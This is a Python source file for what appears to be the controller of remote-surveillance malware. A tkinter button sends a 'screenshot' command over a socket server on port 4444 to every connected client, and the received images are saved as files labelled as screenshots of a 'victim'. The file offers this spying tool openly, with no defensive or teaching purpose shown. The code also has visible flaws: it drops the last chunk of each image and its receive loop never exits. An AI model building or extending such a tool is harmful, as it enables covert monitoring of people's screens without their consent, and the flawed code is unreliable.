from tkinter import *
import socket
import threading
import subprocess
from queue import Queue
from datetime import datetime

messages_queue = Queue()

class GUI:
    def __init__(self):
        # chat window which is currently hidden
        self.Window = Tk()
        self.Window.withdraw()

        # login window
        self.login = Toplevel()
        # set the title
        self.login.title("Login")
        self.login.resizable(width=False,
                             height=False)
        self.login.configure(width=400,
                             height=300)

        # create a Continue Button
        # along with action
        self.go = Button(self.login,
                         text="Take screenshot",
                         font="Helvetica 14 bold",
                         command=lambda: self.take_screenshot())

        self.go.place(relx=0.4,
                      rely=0.55)

        self.Window.mainloop()

    def take_screenshot(self):
        messages_queue.put('screenshot')
        # self.server.takeScreenshot('screenshot')


class Server:

    def __init__(self):
        server_ip = socket.gethostbyname(socket.gethostname())
        # server_ip = '192.168.0.136'
        port = 4444

        address = (server_ip, port)

        self.clients = []  # list of all clients

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(address)

        print("Server is working on " + server_ip)
        server.listen()

        # thread for dealing with messages
        messages_thread = threading.Thread(target=self.messaes_handler)
        messages_thread.start()

        while True:
            # accept connection with client
            conn, addr = server.accept()
            conn.send("NAME".encode("utf-8"))
            self.clients.append(conn)

            # create new thread for that client
            thread = threading.Thread(target=self.handler,
                                      args=(conn, addr))
            thread.start()

    def handler(self,conn, addr):
        print(f"Connected to new client with address {addr}")
        connected = True

        while connected:
            message = conn.recv(1024)
            if message:
                now = datetime.now()
                f = open('screenshots/screenshot_of_victim_'+str(addr[0])+'-'+str(addr[1])+'_'+str(now.strftime("%Y%m%d_%H-%M-%S"))+'.png', 'wb')
                while len(message) == 1024:
                    f.write(message)
                    message = conn.recv(1024)
                print("receiving finished")
                f.close()

        conn.close()

    def messaes_handler(self):
        for msg in iter(messages_queue.get, 'STOP'):
            self.send_message(msg)

    def send_message(self, message):
        for client in self.clients:
            client.send(str.encode(message))



# New thread for server
thread = threading.Thread(target=Server)
thread.start()
# s = Server()
g = GUI()
